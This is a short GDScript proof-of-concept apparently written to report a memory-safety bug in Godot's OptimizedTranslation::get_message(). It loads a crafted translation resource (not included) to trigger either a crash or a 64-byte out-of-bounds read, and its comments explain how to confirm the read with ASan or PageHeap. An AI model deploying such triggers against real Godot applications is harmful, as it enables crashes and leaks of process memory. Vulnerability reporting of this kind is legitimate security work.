extends Node

# Change to "leak" to run the info-leak variant instead of the crash.
const VARIANT = "crash"

func _ready():
	var fname = "bad_translation.tres" if VARIANT == "crash" else "leak_translation.tres"
	var t: Translation = ResourceLoader.load("res://" + fname)
	TranslationServer.add_translation(t)
	TranslationServer.set_locale("en")
	# Any tr() call dispatches to OptimizedTranslation::get_message().
	# Crash variant:  process faults inside get_message() before reaching the print below.
	# Leak variant:   get_message() reads 64 bytes past the strings buffer and returns them.
	#                 On a stock binary the bytes may be null/non-printable -> appears empty.
	#                 Run under ASan or Windows PageHeap to see the explicit OOB READ report.
	var result = tr("LEAK_ME")
	print("tr() returned %d bytes: %s" % [result.length(), result.to_utf8_buffer()])
	print("Execution reached end of _ready() (expected for leak variant; crash variant faults above).")
